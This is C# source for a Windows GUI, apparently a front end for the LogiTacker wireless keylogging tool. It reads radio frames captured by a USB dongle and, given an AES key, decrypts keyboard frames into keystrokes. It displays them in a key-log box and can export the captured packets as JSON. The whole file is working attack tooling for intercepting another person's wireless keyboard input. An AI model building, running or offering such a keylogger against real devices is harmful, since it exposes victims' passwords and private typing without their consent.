﻿using HidSharp;
using HidSharp.Reports;
using LogiTackerKeylogger;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LogiTackerGUI {
    public partial class Form1 : Form {
        DeviceList deviceList;
        HidDevice selectedDevice;
        List<HidDevice> shownDevices;
        bool autoDecrypt = false;
        byte[] deviceKey;

        public Form1() {
            deviceList = DeviceList.Local;
            shownDevices = new List<HidDevice>();
            InitializeComponent();
        }

        private void Form1_Load(object sender,EventArgs e) {
            deviceList.Changed += DeviceListChanged;
            DeviceListChanged(null,null);
        }

        public static byte[] HexStringToByteArray(string hexString) {
            if(hexString.Length % 2 != 0) {
                throw new ArgumentException();
            }

            byte[] data = new byte[hexString.Length / 2];
            for(int index = 0; index < data.Length; index++) {
                string byteValue = hexString.Substring(index * 2,2);
                data[index] = byte.Parse(byteValue,NumberStyles.HexNumber,CultureInfo.InvariantCulture);
            }

            return data;
        }


        #region Events
        private void DeviceListChanged(object sender,DeviceListChangedEventArgs e) {
            Array HidDevices = deviceList.GetHidDevices().ToArray();

            deviceListCombobox.Invoke(new Action(() => {
                deviceListCombobox.Items.Clear();
                foreach(HidDevice device in HidDevices) {
                    if(!device.ToString().Contains("MaMe82") || device.GetMaxInputReportLength() != 65)
                        continue;

                    deviceListCombobox.Items.Add(device.GetFriendlyName() + " " + String.Join(",",device.GetSerialPorts()));
                    shownDevices.Add(device);
                }

                if(shownDevices.Count == 1) {
                    deviceListCombobox.SelectedIndex = 0;
                    selectedDevice = shownDevices[0];
                }
            }));

        }

        private void DeviceListCombobox_SelectedIndexChanged(object sender,EventArgs e) {
            selectedDevice = shownDevices[deviceListCombobox.SelectedIndex];
        }

        #endregion

        private void ButtonStart_Click(object sender,EventArgs e) {
            if(HidHandler.IsBusy) {
                HidHandler.CancelAsync();
            } else {
                HidHandler.RunWorkerAsync();
                buttonStart.Text = "Stop";
                deviceList.Changed -= DeviceListChanged;
                deviceListCombobox.Enabled = false;
            }
        }

        private void HidHandler_DoWork(object sender,DoWorkEventArgs e) {
            Console.Write("Opening device...");

            ReportDescriptor reportDescriptor = selectedDevice.GetReportDescriptor();

            foreach(DeviceItem deviceItem in reportDescriptor.DeviceItems) {
                HidStream hidStream;
                if(selectedDevice.TryOpen(out hidStream)) {
                    Console.WriteLine("OK");
                    hidStream.ReadTimeout = Timeout.Infinite;

                    using(hidStream) {
                        var inputReportBuffer = new byte[selectedDevice.GetMaxInputReportLength()];
                        var inputReceiver = reportDescriptor.CreateHidDeviceInputReceiver();
                        var inputParser = deviceItem.CreateDeviceItemInputParser();

                        inputReceiver.Start(hidStream);

                        while(!HidHandler.CancellationPending) {
                            if(inputReceiver.WaitHandle.WaitOne(1)) {
                                if(!inputReceiver.IsRunning) {
                                    Console.WriteLine("Device disconnected!");
                                    break;
                                }

                                Report report;
                                byte[] buffer = new byte[255];
                                while(inputReceiver.TryRead(inputReportBuffer,0,out report)) {
                                    if(inputParser.TryParseReport(inputReportBuffer,0,report)) {

                                        AirFrame af = new AirFrame(inputReportBuffer);


                                        string address = BitConverter.ToString(af.address).Replace("-",":");
                                        string pid = af.pid.ToString();
                                        string ch = af.rf_channel.ToString();
                                        string len = af.payloadLength.ToString();
                                        string payload = af.payloadLength != 0 ? BitConverter.ToString(af.payload) : "<EMPTY>";
                                        string decrpytedPayload = "";
                                        byte[] decryptedPayloadBytes = null;

                                        try {
                                            if(autoDecrypt) {
                                                decryptedPayloadBytes = af.DecryptKeyboardFrame(deviceKey);
                                                decrpytedPayload = BitConverter.ToString(decryptedPayloadBytes);
                                            }
                                        } catch {
                                            decrpytedPayload = "";
                                        }


                                        try {
                                            if(autoDecrypt && decryptedPayloadBytes != null) {
                                                KeyboardLayout kl = new KeyboardLayout();

                                                textBoxKeys.Invoke(new Action(() => {
                                                    textBoxKeys.Text += kl.ToComboKeyPress(decryptedPayloadBytes);
                                                }));
                                            }

                                        } catch {

                                        }


                                        listView1.Invoke(new Action(() => {
                                            listView1.Items.Insert(0,new ListViewItem(new[] { address,pid,ch,len,payload,decrpytedPayload }));
                                        }));

                                    }
                                }

                            }
                        }
                    }
                } else {
                    Console.WriteLine("Fail");
                }
            }

        }

        private void HidHandler_RunWorkerCompleted(object sender,RunWorkerCompletedEventArgs e) {
            buttonStart.Text = "Start";
            deviceListCombobox.Enabled = false;
            deviceList.Changed += DeviceListChanged;
            MessageBox.Show("Stoped");
        }

        private void ButtonDecryptHistory_Click(object sender,EventArgs e) {
            MessageBox.Show("Not implemented","WIP",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }

        private void ButtonAutoDecrypt_Click(object sender,EventArgs e) {
            if(!isKeyValid()) {
                MessageBox.Show("Invalid AES key","Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
                return;
            }

            if(autoDecrypt)
                buttonAutoDecrypt.Text = "Auto Decrypt: OFF";
            else
                buttonAutoDecrypt.Text = "Auto Decrypt: ON";
            textBoxKey.Enabled = autoDecrypt;
            autoDecrypt = !autoDecrypt;
        }

        private bool isKeyValid() {
            try {
                if(textBoxKey.Text.Length != 32)
                    return false;
                deviceKey = HexStringToByteArray(textBoxKey.Text);
            } catch {
                return false;
            }

            return true;
        }

        private void ButtonClearList_Click(object sender,EventArgs e) {
            if(MessageBox.Show("Are you sure?","Are you sure?",MessageBoxButtons.YesNo,MessageBoxIcon.Question) != DialogResult.Yes)
                return;
            listView1.Items.Clear();
        }

        private void ButtonClearKeyLogs_Click(object sender,EventArgs e) {
            if(MessageBox.Show("Are you sure?","Are you sure?",MessageBoxButtons.YesNo,MessageBoxIcon.Question) != DialogResult.Yes)
                return;
            textBoxKeys.Text = "";
        }

        private void ButtonExportJson_Click(object sender,EventArgs e) {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "JSON files (*.json)|*.json";
            saveFileDialog.RestoreDirectory = true;

            if(saveFileDialog.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                return;

            using(StreamWriter file = new StreamWriter(saveFileDialog.FileName)) {
                file.Write("[");

                for(int PacketIndex = 0; PacketIndex < listView1.Items.Count; PacketIndex++) {
                    file.Write("{" +
                       "\"Address\":\"" + listView1.Items[PacketIndex].SubItems[0].Text + "\"," +
                       "\"PID\":" + listView1.Items[PacketIndex].SubItems[1].Text + "," +
                       "\"Ch\":" + listView1.Items[PacketIndex].SubItems[2].Text + "," +
                       "\"Length\":" + listView1.Items[PacketIndex].SubItems[3].Text + "," +
                       "\"Payload\":\"" + listView1.Items[PacketIndex].SubItems[4].Text + "\"," +
                       "\"DecryptedPayload\":\"" + listView1.Items[PacketIndex].SubItems[5].Text + "\"" +
                       "}");

                    if(PacketIndex < listView1.Items.Count - 1)
                        file.Write(",");
                }

                file.Write("]");
                MessageBox.Show("Export completed!" + Environment.NewLine + "Keep in mind that the latest packets are at the top.","Done!",MessageBoxButtons.OK,MessageBoxIcon.Information);
            }
        }
    }
}
